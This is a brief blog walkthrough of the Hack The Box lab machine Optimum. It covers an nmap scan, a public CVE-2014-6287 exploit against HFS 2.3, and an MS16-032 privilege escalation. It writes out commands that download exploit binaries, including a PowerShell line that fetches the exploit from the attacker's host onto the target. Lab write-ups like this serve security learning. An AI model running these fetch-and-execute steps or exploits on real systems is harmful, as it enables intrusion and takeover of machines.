---
featured_image: "/posts/Optimum/Optimum.png"
title : HTB 15/20 Optimum
published : true
date: 2021-04-24
author : PS
---
## Foothold
*nmap*

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 16:28 EEST
Nmap scan report for 10.10.10.8
Host is up (0.075s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Port 80 timeeee  
![[Pasted image 20210428163007.png]]
Lots of this to check :(  
When trying to login , and failing we see something interesting :  
![[Pasted image 20210428163106.png]]
hmmm  
![[Pasted image 20210428163132.png]]
Hehe  
## User
We use the https://github.com/roughiz/cve-2014-6287.py (do not forget to run it with sudo )  
And get a  shell :  
![[Pasted image 20210428164215.png]]
## Root 
![[Pasted image 20210428164324.png]]
We find the version of the win , search it on the internet and find an exploit :
![[Pasted image 20210428173345.png]]
We will use the compiled version : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032/x64
```bash
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-032/x64/ms16-032.exe
```
Get the exploit on the other machine 
![[Pasted image 20210428174011.png]]
```bash
powershell.exe -c "Invoke-WebRequest -Uri http://10.10.14.7/ms16-032.exe -OutFile C:\Users\kostas\Desktop\ms16-032.exe
```
Run the exploit annnd get root :D 
PS outttttt
